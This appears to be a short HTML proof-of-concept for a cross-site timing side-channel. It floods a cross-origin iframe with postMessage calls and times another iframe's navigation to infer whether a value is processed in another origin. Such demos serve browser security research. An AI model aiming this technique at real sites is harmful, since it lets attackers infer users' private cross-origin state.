<body>
    <iframe id="target" src="https://ndevtk.github.io/cross-site/"></iframe>
    <iframe id="checker" src="https://ndevtk.github.io/cross-site/"></iframe>
    <script>
      let target = document.getElementById('target');
      let checker = document.getElementById('checker');

      async function check(value, url, attempts = 50000) {
        let array = [...Array(attempts)];
        let time1 = await time('', url, attempts, array);
        let time2 = await time(value, url, attempts, array);
        return (time2 < time1);
      }

      function time(value, url, attempts, array) {
        array.forEach(() => target.contentWindow.postMessage(value, '*'));
        return new Promise(resolve => {
          checker.onload = () => {
            resolve(performance.now() - start);
          };
          let start = performance.now();
          checker.contentWindow.location = url;
        });
      }
    </script>
</body>
